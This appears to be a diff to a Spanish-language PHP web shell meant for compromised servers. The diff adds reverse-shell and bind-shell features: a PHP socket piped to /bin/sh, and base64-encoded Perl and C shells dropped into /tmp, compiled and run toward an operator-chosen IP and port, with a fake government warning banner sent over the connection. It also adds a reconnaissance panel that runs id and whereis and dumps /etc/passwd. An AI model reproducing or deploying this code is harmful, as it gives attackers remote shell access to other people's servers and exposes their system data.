@@ -1209,30 +1209,94 @@ psybnc.conf
         echo '<div style="text-align:center;">
         <a href="'.$rfiurl.'" class="sinsubrayado"><h1>'.$nombre.'</h1></a><br><br>
         </div>';
-        
+
         echo '
         <table>
             <form action="'.$rfiurl.'w=socketshell" method="post">
-               <tr><td>Conexi&oacute;n inversa: <br>IP <input type="text" name="ip" value="'.($_POST["ip"]?$_POST["ip"]:$_SERVER["REMOTE_ADDR"]).'"> <br>Puerto <input type="text" name="puertoinversa" value="'.($_POST["puertoinversa"]?$_POST["puertoinversa"]:"80").'"> <br><input type="submit" name="accion" value="Conectar"></td>
-               <td style="width:3px; padding:0px;"></td>
-               <td>Escuchar: <br>Puerto <input type="text" disabled="disabled" name="puertoescuchar" value="'.($_POST["puertoescuchar"]?$_POST["puertoescuchar"]:"8080").'"> <br><input type="submit" disabled="disabled" name="accion" value="Escuchar"></tr>
+                <tr>
+                    <td>
+                        Conexi&oacute;n inversa: <br>IP <input type="text" name="ip" value="'.($_POST["ip"]?$_POST["ip"]:$_SERVER["REMOTE_ADDR"]).'"><br>
+                        Puerto <input type="text" name="puertoinversa" value="'.($_POST["puertoinversa"]?$_POST["puertoinversa"]:"80").'"><br>
+                        <select name="metodoinversa">
+                            <option value="php">PHP</option>
+                            <option value="perl">Perl</option>
+                            <option value="c">C</option>
+                        </select><br><br>
+                        <input type="submit" name="accion" value="Conectar">
+                    </td>
+                    <td style="width:3px; padding:0px;"></td>
+                    <td>
+                        Escuchar: <br>Puerto <input type="text" name="puertoescuchar" value="'.($_POST["puertoescuchar"]?$_POST["puertoescuchar"]:"8080").'"><br>
+                        <select name="metodoescuchar">
+                            <option value="perl">Perl</option>
+                            <option value="c">C</option>
+                        </select><br><br>
+                        <input type="submit" name="accion" value="Escuchar">
+                    </td>
+                </tr>
             </form>
         </table>
         <br>
         ';
         if($_POST["accion"]=="Conectar"){
-            if(is_resource($socket = pfsockopen($_POST["ip"],$_POST["puertoinversa"]))){
-                $descriptorspec = array($socket,$socket,$socket);
-                $shellproc = proc_open("/bin/sh",$descriptorspec,$pipes);
-                fputs($socket,"WARNING:  The use of this U.S. Government system is restricted to authorized users only.  Unauthorized access, use, or modification of this computer system or of the data contained herein or in transit to/from this system constitutes a violation of Title 18, United States Code, Section 1030 and state criminal and civil laws.  These systems and equipment are subject to monitoring to ensure proper performance of applicable security features or procedures.  Such monitoring may result in the acquisition, recording and analysis of all data being communicated, transmitted, processed or stored in this system by a user.  If monitoring reveals possible evidence of criminal activity, such evidence may be provided to law enforcement personnel. \n\n      ANYONE USING THIS SYSTEM EXPRESSLY CONSENTS TO SUCH \n");
-                proc_close($shellproc);
-                fclose($socket);
-                echo '<div class="s">Conectado</div>';
-            }else{
-                echo '<div class="n">No se pudo conectar</div>';
+            if($_POST["metodoinversa"] == "php"){
+                if(is_resource($socket = pfsockopen($_POST["ip"],$_POST["puertoinversa"]))){
+                    $descriptorspec = array($socket,$socket,$socket);
+                    $shellproc = proc_open("/bin/sh",$descriptorspec,$pipes);
+                    fputs($socket,"WARNING:  The use of this U.S. Government system is restricted to authorized users only.  Unauthorized access, use, or modification of this computer system or of the data contained herein or in transit to/from this system constitutes a violation of Title 18, United States Code, Section 1030 and state criminal and civil laws.  These systems and equipment are subject to monitoring to ensure proper performance of applicable security features or procedures.  Such monitoring may result in the acquisition, recording and analysis of all data being communicated, transmitted, processed or stored in this system by a user.  If monitoring reveals possible evidence of criminal activity, such evidence may be provided to law enforcement personnel. \n\n      ANYONE USING THIS SYSTEM EXPRESSLY CONSENTS TO SUCH \n");
+                    proc_close($shellproc);
+                    fclose($socket);
+                    echo '<div class="s">Conectado</div>';
+                }else{
+                    echo '<div class="n">No se pudo conectar</div>';
+                }
+            }elseif($_POST["metodoinversa"] == "perl"){
+		escribirarchivo("/tmp/bc.pl", base64_decode("IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvciIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3IiKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7"));
+		chmod("/tmp/bc.pl",0777);
+                $resultado = shell('perl /tmp/bc.pl '.$_POST["ip"]." ".$_POST["puertoinversa"]." 2>&1", false);
+                if (($resultado===false) or (substr($resultado,0,5)=="Error")){
+                    echo '<div class="n">No se pudo conectar</div>';
+                }else{
+                    echo '<div class="s">Conectado</div>'; 
+                }
+                unlink("/tmp/bc.pl");
+            }elseif($_POST["metodoinversa"] == "c"){
+		escribirarchivo("/tmp/bc.c", base64_decode("I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludCBtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pIHsNCiAgICBpbnQgZmQ7DQogICAgc3RydWN0IHNvY2thZGRyX2luIHNpbjsNCiAgICBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogICAgc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJdKSk7DQogICAgc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsNCiAgICBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsNCiAgICBpZiAoKGNvbm5lY3QoZmQsIChzdHJ1Y3Qgc29ja2FkZHIgKikgJnNpbiwgc2l6ZW9mKHN0cnVjdCBzb2NrYWRkcikpKTwwKSB7DQoJcHJpbnRmKCJFcnJvciIsc3Rkb3V0KTsNCiAgICAgICAgcmV0dXJuIDA7DQogICAgfQ0KICAgIGR1cDIoZmQsIDApOw0KICAgIGR1cDIoZmQsIDEpOw0KICAgIGR1cDIoZmQsIDIpOw0KICAgIHN5c3RlbSgiL2Jpbi9zaCAtaSIpOw0KICAgIGNsb3NlKGZkKTsNCn0="));
+		chmod("/tmp/bc.c",0777);
+                echo '<div class="n">'.exec("gcc -o /tmp/bc /tmp/bc.c").'</div>';
+                unlink("/tmp/bc.c");
+		chmod("/tmp/bc",0777);
+                $resultado = shell('/tmp/bc '.$_POST["ip"]." ".$_POST["puertoinversa"], false);
+                if (($resultado === false) or (substr($resultado,0,5) == "Error") or(leerarchivo("/tmp/bc")==false)){
+                    echo '<div class="n">No se pudo conectar</div>';
+                }else{
+                    echo '<div class="s">Conectado</div>'; 
+                }
+                unlink("/tmp/bc");
             }
         }elseif($_POST["accion"]=="Escuchar"){
-            //aca va un codigo que por ahora no anda :P
+            if($_POST["metodoescuchar"] == "perl"){
+		escribirarchivo("/tmp/bp.pl", base64_decode("IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJFcnJvciI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiRXJyb3IiOw0KbGlzdGVuKFMsMykgfHwgZGllIGRpZSAiRXJyb3IiOw0KYWNjZXB0KENPTk4sUyk7DQpvcGVuIFNURElOLCI8JkNPTk4iOw0Kb3BlbiBTVERPVVQsIj4mQ09OTiI7DQpvcGVuIFNUREVSUiwiPiZDT05OIjsNCmV4ZWMgJFNIRUxMIHx8IGRpZSBwcmludCBDT05OICJDYW50IGV4ZWN1dGUgJFNIRUxMXG4iOw0KY2xvc2UgQ09OTjsNCmV4aXQgMDs="));
+		chmod("/tmp/bp.pl",0777);
+                $resultado = shell("perl /tmp/bp.pl ".$_POST['puertoescuchar']."  2>&1", false);
+                if (($resultado===false) or (substr($resultado,0,5)=="Error")){
+                    echo '<div class="n">No se pudo conectar</div>';
+                }else{
+                    echo '<div class="s">Conectado</div>'; 
+                }
+            }elseif($_POST["metodoescuchar"] == "c"){
+                escribirarchivo("/tmp/bp.c", base64_decode("I2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzdHJpbmcuaD4KI2luY2x1ZGUgPHVuaXN0ZC5oPgojaW5jbHVkZSA8bmV0ZGIuaD4KI2luY2x1ZGUgPHN0ZGxpYi5oPgppbnQgbWFpbihpbnQgYXJnYywgY2hhciAqKmFyZ3YpIHsKICAgIGludCBzb2NrZmQsIG5ld2ZkLCBpOwogICAgY2hhciBwYXNzWzMwXTsKICAgIHN0cnVjdCBzb2NrYWRkcl9pbiByZW1vdGU7CiAgICBkYWVtb24oMSwwKTsKICAgIHNvY2tmZCA9IHNvY2tldChBRl9JTkVULFNPQ0tfU1RSRUFNLDApOwogICAgaWYoIXNvY2tmZCl7CglwcmludGYoIkVycm9yIixzdGRvdXQpOwogICAgICAgIHJldHVybiAwOwogICAgfQogICAgcmVtb3RlLnNpbl9mYW1pbHkgPSBBRl9JTkVUOwogICAgcmVtb3RlLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzFdKSk7CiAgICByZW1vdGUuc2luX2FkZHIuc19hZGRyID0gaHRvbmwoSU5BRERSX0FOWSk7CiAgICBiaW5kKHNvY2tmZCwgKHN0cnVjdCBzb2NrYWRkciAqKSZyZW1vdGUsIDB4MTApOwogICAgbGlzdGVuKHNvY2tmZCwgNSk7CiAgICBuZXdmZD1hY2NlcHQoc29ja2ZkLDAsMCk7CiAgICBkdXAyKG5ld2ZkLDApOwogICAgZHVwMihuZXdmZCwxKTsKICAgIGR1cDIobmV3ZmQsMik7CiAgICBzeXN0ZW0oIi9iaW4vc2ggLWkiKTsKICAgIGNsb3NlKG5ld2ZkKTsKfQ=="));		chmod("/tmp/bc.c",0777);
+                echo '<div class="n">'.exec("gcc -o /tmp/bp /tmp/bp.c").'</div>';
+                unlink("/tmp/bp.c");
+		chmod("/tmp/bp",0777);
+                $resultado = shell('/tmp/bp '.$_POST["puertoescuchar"], false);
+                if (($resultado === false) or (substr($resultado,0,5) == "Error") or(leerarchivo("/tmp/bp")==false)){
+                    echo '<div class="n">No se pudo conectar</div>';
+                }else{
+                    echo '<div class="s">Conectado</div>'; 
+                }
+                unlink("/tmp/bp");
+            }
         }
 
     break; 
@@ -1588,22 +1652,29 @@ function mostrarinformacion(){
         $safemode = "Si";
     } 
     
-    return '<b>'.htmlentities(__FILE__, ENT_QUOTES, 'UTF-8').'</b><br><br>
+    $salida = '<b>'.htmlentities(__FILE__, ENT_QUOTES, 'UTF-8').'</b><br><br>
     <b>'.htmlentities(decodeSize(disk_free_space($ruta)), ENT_QUOTES, 'UTF-8').'</b> / <b>'.htmlentities(decodeSize(disk_total_space($ruta)), ENT_QUOTES, 'UTF-8').'</b><br><br>
     <b>PHP:</b> '.htmlentities(phpversion(), ENT_QUOTES, 'UTF-8').'<br><br>
     <b>Zend:</b> '.htmlentities(zend_version(), ENT_QUOTES, 'UTF-8').'<br><br>
     <b>Safe_mode:</b> '.$safemode.'<br><br>
     <b>Funciones desactivadas:</b> '.htmlentities(ini_get("disable_functions"), ENT_QUOTES, 'UTF-8').'<br><br>
     <b>Open basedir:</b> '.htmlentities(ini_get("open_basedir"), ENT_QUOTES, 'UTF-8').'<br><br>
-    <b>'.htmlentities(php_uname(), ENT_QUOTES, 'UTF-8').'</b><br><br>
-    '.shell("whereis gcc",false).'<br><br>
-    '.shell("whereis perl",false).'<br><br>
-    '.shell("whereis python",false).'<br><br>
-    '.shell("whereis curl",false).'<br><br>
-    '.shell("whereis wget",false).'<br><br>
-    <br>
-    ';
-    $usuarios = explode("\n",leerarchivo("/etc/passwd"));
+    <b>'.htmlentities(php_uname(), ENT_QUOTES, 'UTF-8').'</b><br><br>';
+    if($id = shell("id",false)){
+        $salida.= '<b>'.htmlentities($id, ENT_QUOTES, 'UTF-8').'</b><br><br>
+        '.htmlentities(shell("whereis gcc",false), ENT_QUOTES, 'UTF-8').'<br><br>
+        '.htmlentities(shell("whereis perl",false), ENT_QUOTES, 'UTF-8').'<br><br>
+        '.htmlentities(shell("whereis python",false), ENT_QUOTES, 'UTF-8').'<br><br>
+        '.htmlentities(shell("whereis curl",false), ENT_QUOTES, 'UTF-8').'<br><br>
+        '.htmlentities(shell("whereis wget",false), ENT_QUOTES, 'UTF-8').'<br><br>
+        <br>
+        ';
+    }
+    if($usuarios = leerarchivo("/etc/passwd")){
+        $salida.= '<b>/etc/passwd:</b><br>
+            <textarea style="width:100%;" rows="10">'.$usuarios.'</textarea><br><br>';
+    }
+    return $salida;
 
 }
 ?>
